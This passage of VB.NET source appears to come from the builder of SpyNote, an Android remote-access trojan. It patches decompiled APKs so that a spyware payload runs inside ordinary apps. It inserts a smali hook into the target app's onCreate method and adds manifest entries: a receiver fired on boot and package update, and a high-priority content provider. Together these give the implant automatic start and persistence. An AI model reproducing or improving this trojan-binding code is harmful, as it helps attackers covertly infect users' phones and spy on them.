        Dim superIdx As Integer = onCreateBlock.IndexOf(superCall, StringComparison.Ordinal)
        If superIdx < 0 Then Return False

        Dim insertAt As Integer = onCreateStart + superIdx + superCall.Length
        If insertAt < text.Length AndAlso text(insertAt) = vbCr Then insertAt += 1
        If insertAt < text.Length AndAlso text(insertAt) = vbLf Then insertAt += 1

        text = text.Insert(insertAt, hook)

        Dim localsMatch As Match = Regex.Match(
            text,
            "\.method public onCreate\(\)V\s*\r?\n\s*\.locals (\d+)",
            RegexOptions.None,
            TimeSpan.FromSeconds(1))
        If localsMatch.Success Then
            Dim neededLocals As Integer = Math.Max(2, Integer.Parse(localsMatch.Groups(1).Value))
            text = Regex.Replace(
                text,
                "\.method public onCreate\(\)V\s*\r?\n\s*\.locals \d+",
                ".method public onCreate()V" & vbCrLf & "    .locals " & neededLocals.ToString(),
                RegexOptions.None,
                TimeSpan.FromSeconds(1))
        End If

        File.WriteAllText(smaliPath, text, New UTF8Encoding(False))
        Return True
    End Function

    Private Function FindApplicationClass(manifestPath As String) As String
        Try
            If Not File.Exists(manifestPath) Then Return Nothing
            Dim text As String = File.ReadAllText(manifestPath, Encoding.UTF8)
            Dim packageName As String = Nothing
            Dim pkgMatch As Match = Regex.Match(text, "package=""([^""]+)""", RegexOptions.IgnoreCase, TimeSpan.FromSeconds(2))
            If pkgMatch.Success Then packageName = pkgMatch.Groups(1).Value

            Dim appMatch As Match = Regex.Match(text, "<application\b[^>]*android:name=""([^""]+)""", RegexOptions.IgnoreCase, TimeSpan.FromSeconds(2))
            If Not appMatch.Success Then Return Nothing

            Dim cls As String = appMatch.Groups(1).Value.Trim()
            If cls.StartsWith("."c) AndAlso Not String.IsNullOrWhiteSpace(packageName) Then
                cls = packageName & cls
            End If
            If String.Equals(cls, "android.app.Application", StringComparison.OrdinalIgnoreCase) Then Return Nothing
            Return cls
        Catch
        End Try
        Return Nothing
    End Function

    Private Function EnsureNotifyReceiverInManifest(decodeDir As String) As Boolean
        Try
            Dim manifestPath As String = Path.Combine(decodeDir, "AndroidManifest.xml")
            If Not File.Exists(manifestPath) Then Return False

            SanitizeManifestFile(decodeDir)
            Dim text As String = File.ReadAllText(manifestPath, Encoding.UTF8)
            If text.IndexOf("org.spynote.NotifyReceiver", StringComparison.OrdinalIgnoreCase) >= 0 Then Return True

            Dim receiverBlock As String =
                "    <receiver android:name=""org.spynote.NotifyReceiver"" android:exported=""false"">" & vbCrLf &
                "      <intent-filter>" & vbCrLf &
                "        <action android:name=""android.intent.action.BOOT_COMPLETED"" />" & vbCrLf &
                "        <action android:name=""android.intent.action.MY_PACKAGE_REPLACED"" />" & vbCrLf &
                "      </intent-filter>" & vbCrLf &
                "    </receiver>" & vbCrLf

            Dim appIdx As Integer = text.IndexOf("<application", StringComparison.OrdinalIgnoreCase)
            If appIdx < 0 Then Return False
            Dim insertAt As Integer = text.IndexOf(">"c, appIdx) + 1
            If insertAt <= 0 Then Return False
            If insertAt < text.Length AndAlso text(insertAt) = vbCr Then insertAt += 1
            If insertAt < text.Length AndAlso text(insertAt) = vbLf Then insertAt += 1

            text = text.Insert(insertAt, receiverBlock)
            File.WriteAllText(manifestPath, text, New UTF8Encoding(False))
            Return True
        Catch
            Return False
        End Try
    End Function

    Private Sub PatchAppBootstrapHook(decodeDir As String)
        PatchLauncherHook(decodeDir)
    End Sub

    Private Function EnsureNotifyProviderInManifest(decodeDir As String) As Boolean
        Try
            Dim manifestPath As String = Path.Combine(decodeDir, "AndroidManifest.xml")
            If Not File.Exists(manifestPath) Then Return False

            SanitizeManifestFile(decodeDir)
            Dim text As String = File.ReadAllText(manifestPath, Encoding.UTF8)
            If text.IndexOf("Lorg/spynote/NotifyInitProvider;", StringComparison.OrdinalIgnoreCase) >= 0 OrElse
               text.IndexOf("org.spynote.NotifyInitProvider", StringComparison.OrdinalIgnoreCase) >= 0 Then
                Return True
            End If

            Dim packageName As String = Nothing
            Dim pkgMatch As Match = Regex.Match(text, "package=""([^""]+)""", RegexOptions.IgnoreCase, TimeSpan.FromSeconds(2))
            If pkgMatch.Success Then packageName = pkgMatch.Groups(1).Value.Trim()
            If String.IsNullOrWhiteSpace(packageName) Then packageName = "spynote.client"

            Dim authority As String = packageName & ".spynote.notify"
            Dim providerBlock As String =
                "    <provider android:name=""org.spynote.NotifyInitProvider"" android:authorities=""" & authority & """ android:exported=""false"" android:initOrder=""100"" />" & vbCrLf

            Dim appIdx As Integer = text.IndexOf("<application", StringComparison.OrdinalIgnoreCase)
            If appIdx < 0 Then Return False
            Dim insertAt As Integer = text.IndexOf(">"c, appIdx)
            If insertAt < 0 Then Return False
            insertAt += 1
            If insertAt < text.Length AndAlso text(insertAt) = vbCr Then insertAt += 1
            If insertAt < text.Length AndAlso text(insertAt) = vbLf Then insertAt += 1

            text = text.Insert(insertAt, providerBlock)
            File.WriteAllText(manifestPath, text, New UTF8Encoding(False))
            Return True
        Catch
            Return False
        End Try
    End Function

    Private Function FindLauncherActivityClass(manifestPath As String) As String
        Try
            If Not File.Exists(manifestPath) Then Return Nothing
            SanitizeManifestFile(Path.GetDirectoryName(manifestPath))
            Dim text As String = File.ReadAllText(manifestPath, Encoding.UTF8)
            Dim fromText As String = FindLauncherActivityClassFromText(text)
            If Not String.IsNullOrWhiteSpace(fromText) Then Return fromText

            Dim xmlDoc As New XmlDocument()
            xmlDoc.Load(manifestPath)
            Dim appNode As XmlNode = xmlDoc.DocumentElement?.SelectSingleNode("application")
            If appNode Is Nothing Then Return Nothing

            For Each activityNode As XmlNode In appNode.SelectNodes("activity")
                Dim hasMain As Boolean = False
                Dim hasLauncher As Boolean = False
                For Each filterNode As XmlNode In activityNode.SelectNodes("intent-filter")
                    For Each child As XmlNode In filterNode.ChildNodes
                        Dim nameVal As String = GetAndroidAttr(child, "name")
                        If nameVal = "android.intent.action.MAIN" Then hasMain = True
                        If nameVal = "android.intent.category.LAUNCHER" Then hasLauncher = True
                    Next
                Next
                If hasMain AndAlso hasLauncher Then
                    Dim cls As String = GetAndroidAttr(activityNode, "name")
                    If Not String.IsNullOrWhiteSpace(cls) Then Return cls
                End If
            Next
        Catch
        End Try
        Return Nothing
    End Function

    Private Function FindLauncherActivityClassFromText(manifestText As String) As String
        Try
            If String.IsNullOrWhiteSpace(manifestText) Then Return Nothing

            Dim packageName As String = Nothing
            Dim pkgMatch As Match = Regex.Match(manifestText, "package=""([^""]+)""", RegexOptions.IgnoreCase, TimeSpan.FromSeconds(2))
            If pkgMatch.Success Then packageName = pkgMatch.Groups(1).Value

            Dim pattern As String = "<activity\b[\s\S]*?</activity>"
            For Each actMatch As Match In Regex.Matches(manifestText, pattern, RegexOptions.IgnoreCase, TimeSpan.FromSeconds(3))
                Dim block As String = actMatch.Value
                If block.IndexOf("android.intent.action.MAIN", StringComparison.OrdinalIgnoreCase) < 0 Then Continue For
                If block.IndexOf("android.intent.category.LAUNCHER", StringComparison.OrdinalIgnoreCase) < 0 Then Continue For

                Dim nameMatch As Match = Regex.Match(block, "android:name=""([^""]+)""", RegexOptions.IgnoreCase, TimeSpan.FromSeconds(1))
                If Not nameMatch.Success Then Continue For

                Dim cls As String = nameMatch.Groups(1).Value.Trim()
                If cls.StartsWith("."c) AndAlso Not String.IsNullOrWhiteSpace(packageName) Then
                    cls = packageName & cls
                End If
                Return cls
            Next
        Catch
        End Try
        Return Nothing
    End Function

    Private Function ClassNameToSmaliPath(decodeDir As String, className As String) As String
        Dim relative As String = className.Replace("."c, Path.DirectorySeparatorChar) & ".smali"
        Dim direct As String = Path.Combine(decodeDir, "smali", relative)
        If File.Exists(direct) Then Return direct

        For Each smaliRoot As String In Directory.GetDirectories(decodeDir, "smali*")
            Dim candidate As String = Path.Combine(smaliRoot, relative)
            If File.Exists(candidate) Then Return candidate
        Next
        Return direct
    End Function
End Module
